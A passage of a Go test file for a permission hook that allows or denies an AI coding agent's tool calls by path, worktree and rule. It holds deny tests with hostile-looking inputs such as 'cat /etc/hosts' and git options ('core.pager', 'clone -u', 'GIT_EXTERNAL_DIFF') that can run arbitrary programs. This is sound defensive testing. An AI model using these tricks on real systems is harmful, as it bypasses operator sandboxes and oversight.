	// record-garbage-denies-and-logs
	garbagePath := filepath.Join(stateDir, "record-garbage-denies-and-logs.json")
	require.NoError(t, os.WriteFile(garbagePath, []byte("{"), 0o600))
	tests = append(tests, &testCase{
		_id:               "record-garbage-denies-and-logs",
		_expectedCause:    handSpawnCause,
		_expectedDecision: decisionDeny,
		_isLogged:         true,

		grants:    enforceGrants,
		input:     handSpawn,
		statePath: garbagePath,
	})

	// model-cause-unaffected
	modelPath := filepath.Join(stateDir, "model-cause-unaffected.json")
	require.NoError(t, sessionstate.Save(modelPath, enforceOff))
	tests = append(tests, &testCase{
		_id:               "model-cause-unaffected",
		_expectedCause:    causeAgentModels,
		_expectedDecision: decisionDeny,
		_isLogged:         false,

		grants:    unreadableModelsGrants,
		input:     handSpawn,
		statePath: modelPath,
	})

	// Run tests
	for _, test := range tests {
		t.Run(test._id, func(t *testing.T) {
			var verdict Verdict
			stderr := captureStderr(t, func() {
				verdict = Decide(test.input, policy, test.grants, home, test.statePath)
			})

			assert.Equal(t, test._expectedDecision, verdict.Decision)
			assert.Equal(t, test._expectedCause, verdict.Cause)
			assert.Equalf(t, test._isLogged, strings.Contains(stderr, "toolpolicy: Decide: IsOff:"), "stderr = %q", stderr)
		})
	}
}

func TestDecide_WorktreeSession(t *testing.T) {
	type testCase struct {
		_id               string
		_expectedDecision string
		_expectedReason   string

		grants *Grants
		input  *HookInput
	}

	fixture := fixtureSessionRoots(t)
	anchor := fixture.anchor
	worktrees := filepath.Dir(anchor)
	ruleGrants := fixture.grants()
	ruleGrants.Allow = parseRules([]string{"Bash(go test *)", "EnterWorktree"}, "fixture")
	gitGrants := fixture.grants()
	gitGrants.Allow = parseRules([]string{"Bash(git add*)", "Bash(git clone *)", "Bash(git commit -m *)", "Bash(git diff*)", "Bash(git *)"}, "fixture")
	gitGrants.Deny = parseRules([]string{"Bash(git commit * --amend*)"}, "fixture")
	laneWorktree := filepath.Join(fixture.scratchpad, "wt")
	removedGrants := fixture.grants()
	removedGrants.anchor = sessionAnchor{isMissing: true, path: filepath.Join(worktrees, "gone"), source: anchorSourceTranscript}
	removedGrants.Allow = ruleGrants.Allow
	call := func(tool string, input ToolInput) *HookInput {
		envelope := fixture.input(anchor, "")
		envelope.ToolInput = input
		envelope.ToolName = tool
		return envelope
	}

	humanDir := filepath.Join(fixture.base, "human-added")
	require.NoError(t, os.MkdirAll(humanDir, 0o755))
	require.NoError(t, os.MkdirAll(filepath.Join(anchor, ".claude"), 0o755))
	humanLayer := `{"permissions":{"additionalDirectories":["` + humanDir + `"]}}`
	require.NoError(t, os.WriteFile(filepath.Join(anchor, ".claude", "settings.local.json"), []byte(humanLayer), 0o644))
	humanInput := call("Read", ToolInput{FilePath: filepath.Join(humanDir, "x.md")})
	humanGrants, err := LoadGrants(
		humanInput,
		defaultHookConfig(t),
		fixture.home,
		"",
		"",
		"",
	)
	require.NoError(t, err)

	operatorMakefile := []byte("## deploy: [operator] ship the build\n## test: run tests\n")
	require.NoError(t, os.WriteFile(filepath.Join(anchor, "Makefile"), operatorMakefile, 0o644))
	require.NoError(t, os.WriteFile(filepath.Join(fixture.mainCheckout, "Makefile"), operatorMakefile, 0o644))
	makeGrants := fixture.grants()
	makeGrants.Allow = parseRules([]string{"Bash(make *)"}, "fixture")
	makeMainGrants := fixture.grants()
	makeMainGrants.anchor = sessionAnchor{path: fixture.mainCheckout, source: anchorSourceTranscript}
	makeMainGrants.Allow = makeGrants.Allow
	makeMainInput := fixture.input(fixture.mainCheckout, "make deploy")

	tests := make([]*testCase, 0)

	// bash-read-only-foreign-deny
	tests = append(tests, &testCase{
		_id:               "bash-read-only-foreign-deny",
		_expectedDecision: decisionDeny,
		_expectedReason:   causeReadOutside,

		grants: ruleGrants,
		input:  call("Bash", ToolInput{Command: "cat /etc/hosts"}),
	})

	// bash-git-C-peek-deny
	tests = append(tests, &testCase{
		_id:               "bash-git-C-peek-deny",
		_expectedDecision: decisionDeny,
		_expectedReason:   causeReadOutside,

		grants: ruleGrants,
		input:  call("Bash", ToolInput{Command: "git -C " + fixture.foreign + " log -1"}),
	})

	// bash-go-build-C-peek-deny
	tests = append(tests, &testCase{
		_id:               "bash-go-build-C-peek-deny",
		_expectedDecision: decisionDeny,
		_expectedReason:   causeWriteOutside,

		grants: ruleGrants,
		input:  call("Bash", ToolInput{Command: "go build -C " + fixture.foreign + " ./..."}),
	})

	// bash-cp-images-to-scratchpad-accept-edits-allow
	tests = append(tests, &testCase{
		_id:               "bash-cp-images-to-scratchpad-accept-edits-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   acceptEditsAllowReason,

		grants: ruleGrants,
		input:  call("Bash", ToolInput{Command: "cp " + filepath.Join(fixture.sessionTemp, "images", "a.png") + " " + filepath.Join(fixture.scratchpad, "a.png")}),
	})

	// bash-redirect-tmp-deny-steer
	tests = append(tests, &testCase{
		_id:               "bash-redirect-tmp-deny-steer",
		_expectedDecision: decisionDeny,
		_expectedReason:   causeTmpWrite,

		grants: ruleGrants,
		input:  call("Bash", ToolInput{Command: "echo hi > /tmp/x"}),
	})

	// bash-trailing-dollar-rule-allow
	tests = append(tests, &testCase{
		_id:               "bash-trailing-dollar-rule-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   settingsRuleReason + "Bash(go test *)",

		grants: ruleGrants,
		input:  call("Bash", ToolInput{Command: "go test ./internal/server/ -run TestHandleSkillGraph$"}),
	})

	// edit-peek-session-go-deny
	tests = append(tests, &testCase{
		_id:               "edit-peek-session-go-deny",
		_expectedDecision: decisionDeny,
		_expectedReason:   causeWriteOutside,

		grants: ruleGrants,
		input:  call("Edit", ToolInput{FilePath: filepath.Join(fixture.foreign, "session", "session.go")}),
	})

	// read-main-checkout-deny
	tests = append(tests, &testCase{
		_id:               "read-main-checkout-deny",
		_expectedDecision: decisionDeny,
		_expectedReason:   causeReadOutside,

		grants: ruleGrants,
		input:  call("Read", ToolInput{FilePath: filepath.Join(fixture.mainCheckout, "README.md")}),
	})

	// read-session-temp-images-allow
	tests = append(tests, &testCase{
		_id:               "read-session-temp-images-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   rootsAllowReason,

		grants: ruleGrants,
		input:  call("Read", ToolInput{FilePath: filepath.Join(fixture.sessionTemp, "images", "a.png")}),
	})

	// write-session-temp-deny
	tests = append(tests, &testCase{
		_id:               "write-session-temp-deny",
		_expectedDecision: decisionDeny,
		_expectedReason:   causeWriteOutside,

		grants: ruleGrants,
		input:  call("Write", ToolInput{FilePath: filepath.Join(fixture.sessionTemp, "tasks", "x.output")}),
	})

	// edit-git-config-protected
	tests = append(tests, &testCase{
		_id:               "edit-git-config-protected",
		_expectedDecision: decisionDeny,
		_expectedReason:   causeGitDir,

		grants: ruleGrants,
		input:  call("Edit", ToolInput{FilePath: filepath.Join(anchor, ".git", "config")}),
	})

	// edit-vscode-engine-protected
	tests = append(tests, &testCase{
		_id:               "edit-vscode-engine-protected",
		_expectedDecision: decisionDeny,
		_expectedReason:   causeEngineProtected,

		grants: ruleGrants,
		input:  call("Edit", ToolInput{FilePath: filepath.Join(anchor, ".vscode", "settings.json")}),
	})

	// edit-plans-allow
	tests = append(tests, &testCase{
		_id:               "edit-plans-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   rootsAllowReason,

		grants: ruleGrants,
		input:  call("Edit", ToolInput{FilePath: filepath.Join(fixture.home, ".claude", "plans", "x.md")}),
	})

	// glob-absolute-pattern-foreign-deny
	tests = append(tests, &testCase{
		_id:               "glob-absolute-pattern-foreign-deny",
		_expectedDecision: decisionDeny,
		_expectedReason:   causeReadOutside,

		grants: ruleGrants,
		input:  call("Glob", ToolInput{Pattern: filepath.Join(fixture.foreign, "**", "*.go")}),
	})

	// glob-relative-dotdot-pattern-deny
	tests = append(tests, &testCase{
		_id:               "glob-relative-dotdot-pattern-deny",
		_expectedDecision: decisionDeny,
		_expectedReason:   causeReadOutside,

		grants: ruleGrants,
		input:  call("Glob", ToolInput{Pattern: "../../**/*.go"}),
	})

	// glob-name-pattern-allow
	tests = append(tests, &testCase{
		_id:               "glob-name-pattern-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   rootsAllowReason,

		grants: ruleGrants,
		input:  call("Glob", ToolInput{Pattern: "**.go"}),
	})

	// grep-no-path-allow
	tests = append(tests, &testCase{
		_id:               "grep-no-path-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   rootsAllowReason,

		grants: ruleGrants,
		input:  call("Grep", ToolInput{}),
	})

	// read-human-additional-dir-allow
	tests = append(tests, &testCase{
		_id:               "read-human-additional-dir-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   rootsAllowReason,

		grants: humanGrants,
		input:  humanInput,
	})

	// enter-name-rule-allow
	tests = append(tests, &testCase{
		_id:               "enter-name-rule-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   settingsRuleReason + "EnterWorktree",

		grants: ruleGrants,
		input:  call("EnterWorktree", ToolInput{}),
	})

	// enter-path-own-worktrees-allow
	tests = append(tests, &testCase{
		_id:               "enter-path-own-worktrees-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   settingsRuleReason + "EnterWorktree",

		grants: ruleGrants,
		input:  call("EnterWorktree", ToolInput{Path: fixture.sibling}),
	})

	// enter-path-foreign-repo-deny
	tests = append(tests, &testCase{
		_id:               "enter-path-foreign-repo-deny",
		_expectedDecision: decisionDeny,
		_expectedReason:   causeWorktreeOutside,

		grants: ruleGrants,
		input:  call("EnterWorktree", ToolInput{Path: filepath.Join(fixture.foreign, ".claude", "worktrees", "x")}),
	})

	// enter-path-container-itself-deny
	tests = append(tests, &testCase{
		_id:               "enter-path-container-itself-deny",
		_expectedDecision: decisionDeny,
		_expectedReason:   causeWorktreeOutside,

		grants: ruleGrants,
		input:  call("EnterWorktree", ToolInput{Path: worktrees}),
	})

	// enter-path-removed-anchor-deny
	tests = append(tests, &testCase{
		_id:               "enter-path-removed-anchor-deny",
		_expectedDecision: decisionDeny,
		_expectedReason:   causeAnchorRemoved,

		grants: removedGrants,
		input:  call("EnterWorktree", ToolInput{Path: fixture.sibling}),
	})

	// bash-git-C-add-plain-rule-allow
	tests = append(tests, &testCase{
		_id:               "bash-git-C-add-plain-rule-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   settingsRuleReason + "Bash(git add*)",

		grants: gitGrants,
		input:  call("Bash", ToolInput{Command: "git -C " + laneWorktree + " add -A"}),
	})

	// bash-git-C-amend-deny-rule
	tests = append(tests, &testCase{
		_id:               "bash-git-C-amend-deny-rule",
		_expectedDecision: decisionDeny,
		_expectedReason:   "Bash(git commit * --amend*)",

		grants: gitGrants,
		input:  call("Bash", ToolInput{Command: "git -C " + laneWorktree + " commit -m x --amend"}),
	})

	// bash-git-C-redirect-diff-allow
	tests = append(tests, &testCase{
		_id:               "bash-git-C-redirect-diff-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   settingsRuleReason + "Bash(git diff*)",

		grants: gitGrants,
		input:  call("Bash", ToolInput{Command: "git -C " + laneWorktree + " diff a > " + filepath.Join(fixture.scratchpad, "d.txt")}),
	})

	// bash-git-config-under-wildcard-deny
	tests = append(tests, &testCase{
		_id:               "bash-git-config-under-wildcard-deny",
		_expectedDecision: decisionDeny,
		_expectedReason:   causeGitGlobalOption,

		grants: gitGrants,
		input:  call("Bash", ToolInput{Command: "git -c core.pager=x status"}),
	})

	// bash-git-clone-u-under-rule-deny
	tests = append(tests, &testCase{
		_id:               "bash-git-clone-u-under-rule-deny",
		_expectedDecision: decisionDeny,
		_expectedReason:   causeGitExec,

		grants: gitGrants,
		input:  call("Bash", ToolInput{Command: "git clone -u x . " + filepath.Join(fixture.scratchpad, "c")}),
	})

	// bash-git-env-under-wildcard-deny
	tests = append(tests, &testCase{
		_id:               "bash-git-env-under-wildcard-deny",
		_expectedDecision: decisionDeny,
		_expectedReason:   causeGitEnvironment,

		grants: gitGrants,
		input:  call("Bash", ToolInput{Command: "GIT_EXTERNAL_DIFF=x git diff"}),
	})

	// make-operator-target-worktree-deny
	tests = append(tests, &testCase{
		_id:               "make-operator-target-worktree-deny",
		_expectedDecision: decisionDeny,
		_expectedReason:   causeOperatorCommand,

		grants: makeGrants,
		input:  call("Bash", ToolInput{Command: "make deploy"}),
	})

	// make-operator-target-main-allow
	tests = append(tests, &testCase{
		_id:               "make-operator-target-main-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   settingsRuleReason + "Bash(make *)",

		grants: makeMainGrants,
		input:  makeMainInput,
	})

	// make-plain-target-worktree-allow
	tests = append(tests, &testCase{
		_id:               "make-plain-target-worktree-allow",
		_expectedDecision: decisionAllow,
		_expectedReason:   settingsRuleReason + "Bash(make *)",

		grants: makeGrants,
		input:  call("Bash", ToolInput{Command: "make test"}),
	})

	// pipe-operator-make-deny
	tests = append(tests, &testCase{
		_id:               "pipe-operator-make-deny",
		_expectedDecision: decisionDeny,
		_expectedReason:   causeCompound,

		grants: makeGrants,
		input:  call("Bash", ToolInput{Command: "make deploy | tail -1"}),
	})

	// Run tests
	for _, test := range tests {
		t.Run(test._id, func(t *testing.T) {
			verdict := Decide(test.input, fixture.policy, test.grants, fixture.home, "")
			assert.Equal(t, test._expectedDecision, verdict.Decision)
			assert.Contains(t, verdict.Reason, test._expectedReason)
		})
	}
}

func TestDecideNeverDefersGatedTools(t *testing.T) {
	type testCase struct {
		_id string

		input *HookInput
	}

	fixture := fixtureSessionRoots(t)
	grants := fixture.grants("Bash(jq *)", "Skill(qq)")
	grants.Allow = parseRules([]string{"Bash(go test *)", "WebFetch(domain:code.claude.com)", "mcp__goland", "EnterWorktree"}, "fixture")
	call := func(tool string, input ToolInput) *HookInput {
		envelope := fixture.input(fixture.anchor, "")
		envelope.ToolInput = input
		envelope.ToolName = tool
		return envelope
	}

	tests := make([]*testCase, 0)

	// bash-rule
	tests = append(tests, &testCase{
		_id: "bash-rule",

		input: call("Bash", ToolInput{Command: "go test ./... -run X$"}),
	})

	// bash-read-only
	tests = append(tests, &testCase{
		_id: "bash-read-only",

		input: call("Bash", ToolInput{Command: "ls sub"}),
	})

	// accept-edits-cp
	tests = append(tests, &testCase{
		_id: "accept-edits-cp",

		input: call("Bash", ToolInput{Command: "cp a b"}),
	})

	// sed-in-place
	tests = append(tests, &testCase{
		_id: "sed-in-place",

		input: call("Bash", ToolInput{Command: "sed -i '' s/a/b/ x.go"}),
	})

	// read
	tests = append(tests, &testCase{
		_id: "read",

		input: call("Read", ToolInput{FilePath: "x.go"}),
	})

	// edit
	tests = append(tests, &testCase{
		_id: "edit",

		input: call("Edit", ToolInput{FilePath: "x.go"}),
	})

	// glob
	tests = append(tests, &testCase{
		_id: "glob",

		input: call("Glob", ToolInput{Pattern: "**/*.go"}),
	})

	// webfetch-rule
	tests = append(tests, &testCase{
		_id: "webfetch-rule",

		input: call("WebFetch", ToolInput{Url: "https://code.claude.com/docs"}),
	})

	// mcp-rule
	tests = append(tests, &testCase{
		_id: "mcp-rule",

		input: call("mcp__goland__search_symbol", ToolInput{}),
	})

	// skill
	tests = append(tests, &testCase{
		_id: "skill",

		input: call("Skill", ToolInput{Skill: "qq"}),
	})

	// agent-with-model
	tests = append(tests, &testCase{
		_id: "agent-with-model",

		input: call("Agent", ToolInput{Model: "opus", SubagentType: "Explore"}),
	})

	// tool-search
	tests = append(tests, &testCase{
		_id: "tool-search",

		input: call("ToolSearch", ToolInput{}),
	})

	// enter-worktree
	tests = append(tests, &testCase{
		_id: "enter-worktree",

		input: call("EnterWorktree", ToolInput{}),
	})

	// Run tests
	for _, test := range tests {
		t.Run(test._id, func(t *testing.T) {
			assert.NotEqual(t, decisionNone, Decide(test.input, fixture.policy, grants, fixture.home, "").Decision)
		})
	}
}

func TestIsSafePathFlagCall(t *testing.T) {
	type testCase struct {
		_id         string
		_shouldPass bool

		call *resolvedCall
	}

	tests := make([]*testCase, 0)

	// recursive
	tests = append(tests, &testCase{
		_id:         "recursive",
		_shouldPass: true,

		call: &resolvedCall{args: []string{"-R", "a", "b"}, head: "cp"},
	})

	// recursive-preserve-cluster
	tests = append(tests, &testCase{
		_id:         "recursive-preserve-cluster",
		_shouldPass: true,

		call: &resolvedCall{args: []string{"-Rp", "a", "b"}, head: "cp"},
	})

	// target-directory-short
	tests = append(tests, &testCase{
		_id:         "target-directory-short",
		_shouldPass: false,

		call: &resolvedCall{args: []string{"-t", "b", "a"}, head: "cp"},
	})

	// target-directory-long
	tests = append(tests, &testCase{
		_id:         "target-directory-long",
		_shouldPass: false,

		call: &resolvedCall{args: []string{"--target-directory=b", "a"}, head: "cp"},
	})

	// bare-dash
	tests = append(tests, &testCase{
		_id:         "bare-dash",
		_shouldPass: false,

		call: &resolvedCall{args: []string{"-", "b"}, head: "cp"},
	})

	// no-flag
	tests = append(tests, &testCase{
		_id:         "no-flag",
		_shouldPass: false,

		call: &resolvedCall{args: []string{"a", "b"}, head: "cp"},
	})

	// unlisted-head
	tests = append(tests, &testCase{
		_id:         "unlisted-head",
		_shouldPass: false,

		call: &resolvedCall{args: []string{"-f", "a", "b"}, head: "mv"},
	})

	// Run tests
	for _, test := range tests {
		t.Run(test._id, func(t *testing.T) {
			assert.Equal(t, test._shouldPass, isSafePathFlagCall(test.call))
		})
	}
}

func TestNamesFencedRoot(t *testing.T) {
	type testCase struct {
		_id       string
		_expected bool

		command string
		root    string
	}

	home := "/Users/u"
	archive := "/Users/u/GolandProjects/agent-plans"
	tests := make([]*testCase, 0)

	// absolute-spelling
	tests = append(tests, &testCase{
		_id:       "absolute-spelling",
		_expected: true,

		command: "jq . /Users/u/GolandProjects/agent-plans/repo/proposals/problems.json",
		root:    archive,
	})

	// tilde-spelling
	tests = append(tests, &testCase{
		_id:       "tilde-spelling",
		_expected: true,

		command: "jq . ~/GolandProjects/agent-plans/repo/proposals/problems.json",
		root:    archive,
	})

	// home-variable-spelling
	tests = append(tests, &testCase{
		_id:       "home-variable-spelling",
		_expected: true,

		command: "cat $HOME/GolandProjects/agent-plans/repo/backlog/backlog.json",
		root:    archive,
	})

	// braced-home-variable-spelling
	tests = append(tests, &testCase{
		_id:       "braced-home-variable-spelling",
		_expected: true,

		command: "cat ${HOME}/GolandProjects/agent-plans/repo/backlog/backlog.json",
		root:    archive,
	})

	// git-dash-c-tilde-spelling
	tests = append(tests, &testCase{
		_id:       "git-dash-c-tilde-spelling",
		_expected: true,

		command: "git -C ~/GolandProjects/agent-plans/repo status --porcelain -- backlog proposals",
		root:    archive,
	})

	// sibling-dir-not-named
	tests = append(tests, &testCase{
		_id:       "sibling-dir-not-named",
		_expected: false,

		command: "ls ~/GolandProjects/claude-configs",
		root:    archive,
	})

	// own-store-inside-worktree-not-named
	tests = append(tests, &testCase{
		_id:       "own-store-inside-worktree-not-named",
		_expected: false,

		command: "jq . store/proposals/problems.json",
		root:    archive,
	})

	// root-outside-home-absolute-only
	tests = append(tests, &testCase{
		_id:       "root-outside-home-absolute-only",
		_expected: false,

		command: "ls ~/evals",
		root:    "/work/evals",
	})

	// root-is-home-prefix-only
	tests = append(tests, &testCase{
		_id:       "root-is-home-prefix-only",
		_expected: false,

		command: "ls ~/GolandProjects",
		root:    "/Users/uu/GolandProjects",
	})

	// empty-root
	tests = append(tests, &testCase{
		_id:       "empty-root",
		_expected: false,

		command: "ls ~/GolandProjects/agent-plans",
		root:    "",
	})

	// Run tests
	for _, test := range tests {
		t.Run(test._id, func(t *testing.T) {
			assert.Equal(t, test._expected, namesFencedRoot(test.command, home, test.root))
		})
	}
}

func TestRun(t *testing.T) {
	type testCase struct {
		_id             string
		_absentStdout   string
		_expectedExit   int
		_expectedLedger int
		_expectedStderr string
		_expectedStdout string

		args  []string
		stdin string
	}

	t.Setenv(headlessEnv, "")
	t.Setenv(desktop.HostSessionEnv, "")
	hookConfigHome(t, renderedHookConfig(t))
	base := t.TempDir()
	ledger := filepath.Join(base, "ledger", "denials.jsonl")
	cwd, err := os.Getwd()
	require.NoError(t, err)
	denyInput := `{"session_id":"s1","cwd":"` + cwd + `","permission_mode":"default","tool_name":"Bash","tool_input":{"command":"brew list"}}`
	noneInput := `{"session_id":"s1","cwd":"` + cwd + `","permission_mode":"default","tool_name":"ExitPlanMode","tool_input":{}}`

	appliedCwd := filepath.Join(base, "applied")
	require.NoError(t, os.MkdirAll(appliedCwd, 0o755))
	humanTranscript, err := filepath.Abs("testdata/transcript-allow-settings.jsonl")
	require.NoError(t, err)
	appliedCommand, err := json.Marshal("toolpolicy allow 'Bash(uptime)'")
	require.NoError(t, err)
	appliedInput := `{"session_id":"s2","cwd":"` + appliedCwd + `","permission_mode":"acceptEdits","tool_name":"Bash","transcript_path":"` +
		humanTranscript + `","tool_input":{"command":` + string(appliedCommand) + `}}`
	checkCommand, err := json.Marshal("toolpolicy check 'lsof -i :6101'")
	require.NoError(t, err)
	checkInput := `{"session_id":"s3","cwd":"` + appliedCwd + `","permission_mode":"acceptEdits","tool_name":"Bash","tool_input":{"command":` + string(checkCommand) + `}}`
	promptInput := `{"session_id":"s4","cwd":"` + appliedCwd + `","hook_event_name":"UserPromptSubmit","prompt":"/fimplement"}`
	skillInput := `{"session_id":"s5","cwd":"` + appliedCwd + `","hook_event_name":"PostToolUse","tool_name":"Skill","tool_input":{"skill":"fimplement","args":""}}`

	tests := make([]*testCase, 0)

	// applied-command-no-ledger
	tests = append(tests, &testCase{
		_id:             "applied-command-no-ledger",
		_absentStdout:   "additionalContext",
		_expectedExit:   0,
		_expectedStdout: causeSettingsApplied,
		_expectedLedger: 0,

		args:  []string{"-ledger", ledger},
		stdin: appliedInput,
	})

	// freeze-command-no-ledger-line
	freezeCwd := filepath.Join(base, "freeze")
	require.NoError(t, os.MkdirAll(filepath.Join(freezeCwd, "plans", "2026-09-28-probe-7ea30b5", "2026-09-28-probe-wip-7ea30b5", "design"), 0o755))
	freezeTranscript := filepath.Join(base, "freeze-transcript.jsonl")
	freezeLine := `{"type":"user","turnOrigin":"human","cwd":"` + freezeCwd + `","message":{"role":"user","content":"<command-name>/fdesign</command-name>\n<command-args>probe.md</command-args>"}}` + "\n"
	require.NoError(t, os.WriteFile(freezeTranscript, []byte(freezeLine), 0o644))
	freezeCommand, err := json.Marshal("toolpolicy freeze plans/2026-09-28-probe-7ea30b5/2026-09-28-probe-wip-7ea30b5")
	require.NoError(t, err)
	freezeInput := `{"session_id":"s6","cwd":"` + freezeCwd + `","permission_mode":"acceptEdits","tool_name":"Bash","transcript_path":"` +
		freezeTranscript + `","tool_input":{"command":` + string(freezeCommand) + `}}`
	tests = append(tests, &testCase{
		_id:             "freeze-command-no-ledger-line",
		_absentStdout:   "additionalContext",
		_expectedExit:   0,
		_expectedStdout: causeFreezeApplied,
		_expectedLedger: 0,

		args:  []string{"-ledger", ledger},
		stdin: freezeInput,
	})

	// deny-emits-json-and-ledger
	tests = append(tests, &testCase{
		_id:             "deny-emits-json-and-ledger",
		_absentStdout:   "additionalContext",
		_expectedExit:   0,
		_expectedStdout: `"permissionDecision":"deny"`,
		_expectedLedger: 1,

		args:  []string{"-ledger", ledger},
		stdin: denyInput,
	})

	// none-empty-stdout
	tests = append(tests, &testCase{
		_id:             "none-empty-stdout",
		_absentStdout:   "additionalContext",
		_expectedExit:   0,
		_expectedStdout: "",
		_expectedLedger: 1,

		args:  []string{"-ledger", ledger},
		stdin: noneInput,
	})

	// policy-flag-gone-usage
	tests = append(tests, &testCase{
		_id:             "policy-flag-gone-usage",
		_absentStdout:   "additionalContext",
		_expectedExit:   usageExitCode,
		_expectedLedger: 1,
		_expectedStderr: "flag provided but not defined: -policy",
		_expectedStdout: "",

		args:  []string{"-policy", filepath.Join(base, "policy.json")},
		stdin: denyInput,
	})

	// repos-flag-parsed
	tests = append(tests, &testCase{
		_id:             "repos-flag-parsed",
		_absentStdout:   "additionalContext",
		_expectedExit:   0,
		_expectedLedger: 2,
		_expectedStderr: "",
		_expectedStdout: `"permissionDecision":"deny"`,

		args:  []string{"-ledger", ledger, "-repos", filepath.Join(base, "repos.json")},
		stdin: denyInput,
	})

	// gate-repo-flag-parsed
	tests = append(tests, &testCase{
		_id:             "gate-repo-flag-parsed",
		_absentStdout:   "additionalContext",
		_expectedExit:   0,
		_expectedLedger: 3,
		_expectedStderr: "",
		_expectedStdout: `"permissionDecision":"deny"`,

		args:  []string{"-ledger", ledger, "-gate-repo", base},
		stdin: denyInput,
	})

	// check-command-no-ledger
	tests = append(tests, &testCase{
		_id:             "check-command-no-ledger",
		_absentStdout:   "additionalContext",
		_expectedExit:   0,
		_expectedLedger: 3,
		_expectedStderr: "",
		_expectedStdout: causeCheckReport,

		args:  []string{"-ledger", ledger},
		stdin: checkInput,
	})

	// user-prompt-submit-dispatch
	tests = append(tests, &testCase{
		_id:             "user-prompt-submit-dispatch",
		_absentStdout:   "permissionDecision",
		_expectedExit:   0,
		_expectedLedger: 3,
		_expectedStderr: "",
		_expectedStdout: planHookHeader + "\n- plan: ",

		args:  []string{"-ledger", ledger},
		stdin: promptInput,
	})

	// post-tool-use-skill-dispatch
	tests = append(tests, &testCase{
		_id:             "post-tool-use-skill-dispatch",
		_absentStdout:   "permissionDecision",
		_expectedExit:   0,
		_expectedLedger: 3,
		_expectedStderr: "",
		_expectedStdout: `{"hookSpecificOutput":{"additionalContext":"` + planHookHeader + `\n- plan: `,

		args:  []string{"-ledger", ledger},
		stdin: skillInput,
	})

	// check-subcommand-stdout
	tests = append(tests, &testCase{
		_id:             "check-subcommand-stdout",
		_absentStdout:   "permissionDecision",
		_expectedExit:   0,
		_expectedLedger: 3,
		_expectedStderr: "",
		_expectedStdout: "1. lsof -i :6101 → ",

		args:  []string{"check", "lsof -i :6101"},
		stdin: "",
	})

	// permission-request-allowed-call-answers-allow
	permissionAllowInput := `{"session_id":"s7","cwd":"` + cwd + `","hook_event_name":"PermissionRequest","permission_mode":"default","tool_name":"Bash","tool_input":{"command":"git status"}}`
	tests = append(tests, &testCase{
		_id:             "permission-request-allowed-call-answers-allow",
		_absentStdout:   "permissionDecision",
		_expectedExit:   0,
		_expectedLedger: 3,
		_expectedStderr: "",
		_expectedStdout: `{"hookSpecificOutput":{"decision":{"behavior":"allow"},"hookEventName":"PermissionRequest"}}`,

		args:  []string{"-ledger", ledger},
		stdin: permissionAllowInput,
	})

	// permission-request-denied-call-answers-deny-without-ledger
	permissionDenyInput := `{"session_id":"s7","cwd":"` + cwd + `","hook_event_name":"PermissionRequest","permission_mode":"default","tool_name":"Bash","tool_input":{"command":"brew list"}}`
	tests = append(tests, &testCase{
		_id:             "permission-request-denied-call-answers-deny-without-ledger",
		_absentStdout:   "permissionDecision",
		_expectedExit:   0,
		_expectedLedger: 3,
		_expectedStderr: "",
		_expectedStdout: `{"hookSpecificOutput":{"decision":{"behavior":"deny","message":"tool-policy: denied Bash`,

		args:  []string{"-ledger", ledger},
		stdin: permissionDenyInput,
	})

	// permission-request-exit-plan-mode-left-to-user
	permissionPlanInput := `{"session_id":"s7","cwd":"` + cwd + `","hook_event_name":"PermissionRequest","permission_mode":"plan","tool_name":"ExitPlanMode","tool_input":{}}`
	tests = append(tests, &testCase{
		_id:             "permission-request-exit-plan-mode-left-to-user",
		_absentStdout:   "decision",
		_expectedExit:   0,
		_expectedLedger: 3,
		_expectedStderr: "",
		_expectedStdout: "",

		args:  []string{"-ledger", ledger},
		stdin: permissionPlanInput,
	})

	// permission-request-self-service-not-rerun
	permissionSelfInput := `{"session_id":"s8","cwd":"` + appliedCwd + `","hook_event_name":"PermissionRequest","permission_mode":"acceptEdits","tool_name":"Bash","transcript_path":"` +
		humanTranscript + `","tool_input":{"command":` + string(appliedCommand) + `}}`
	tests = append(tests, &testCase{
		_id:             "permission-request-self-service-not-rerun",
		_absentStdout:   "decision",
		_expectedExit:   0,
		_expectedLedger: 3,
		_expectedStderr: "",
		_expectedStdout: "",

		args:  []string{"-ledger", ledger},
		stdin: permissionSelfInput,
	})

	// permission-request-foreign-actions-shape-tolerated
	permissionShapeInput := `{"session_id":"s7","cwd":"` + cwd + `","hook_event_name":"PermissionRequest","permission_mode":"default","tool_name":"Bash","tool_input":{"command":"git status","actions":"not-a-list"}}`
	tests = append(tests, &testCase{
		_id:             "permission-request-foreign-actions-shape-tolerated",
		_absentStdout:   "permissionDecision",
		_expectedExit:   0,
		_expectedLedger: 3,
		_expectedStderr: "",
		_expectedStdout: `"behavior":"allow"`,

		args:  []string{"-ledger", ledger},
		stdin: permissionShapeInput,
	})

	// auto-mode-allow-withheld
	autoAllowInput := `{"session_id":"s9","cwd":"` + cwd + `","permission_mode":"auto","tool_name":"Bash","tool_input":{"command":"git status"}}`
	tests = append(tests, &testCase{
		_id:             "auto-mode-allow-withheld",
		_absentStdout:   "permissionDecision",
		_expectedExit:   0,
		_expectedLedger: 3,
		_expectedStderr: "",
		_expectedStdout: "",

		args:  []string{"-ledger", ledger},
		stdin: autoAllowInput,
	})

	// auto-mode-deny-stands
	autoDenyInput := `{"session_id":"s9","cwd":"` + cwd + `","permission_mode":"auto","tool_name":"Bash","tool_input":{"command":"brew list"}}`
	tests = append(tests, &testCase{
		_id:             "auto-mode-deny-stands",
		_absentStdout:   "additionalContext",
		_expectedExit:   0,
		_expectedLedger: 4,
		_expectedStderr: "",
		_expectedStdout: `"permissionDecision":"deny"`,

		args:  []string{"-ledger", ledger},
		stdin: autoDenyInput,
	})

	// auto-mode-permission-request-allow-withheld
	autoRequestInput := `{"session_id":"s9","cwd":"` + cwd + `","hook_event_name":"PermissionRequest","permission_mode":"auto","tool_name":"Bash","tool_input":{"command":"git status"}}`
	tests = append(tests, &testCase{
		_id:             "auto-mode-permission-request-allow-withheld",
		_absentStdout:   "decision",
		_expectedExit:   0,
